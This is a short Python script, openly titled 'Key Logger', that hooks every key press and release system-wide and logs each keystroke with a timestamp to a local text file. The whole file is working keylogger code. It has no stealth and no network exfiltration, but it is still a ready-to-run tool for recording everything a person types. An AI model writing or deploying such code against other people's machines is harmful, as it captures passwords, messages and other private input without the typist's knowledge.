import keyboard
import time
import threading
import logging
import datetime
import os
import platform

# Set up logging
logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_key_press(event):
    logging.info(f'Key pressed: {event.name}')

def on_key_release(event):
    logging.info(f'Key released: {event.name}')

def main():
    try:
        keyboard.on_press(on_key_press)
        keyboard.on_release(on_key_release)

        # Keep the program running until manually stopped
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('Program stopped manually')
    except Exception as e:
        logging.error(f'An error occurred: {e}')
        print(f'An error occurred: {e}')
    finally:
        keyboard.unhook_all()

if __name__ == "__main__":
    if platform.system() == 'Windows':
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW("Key Logger")
    main()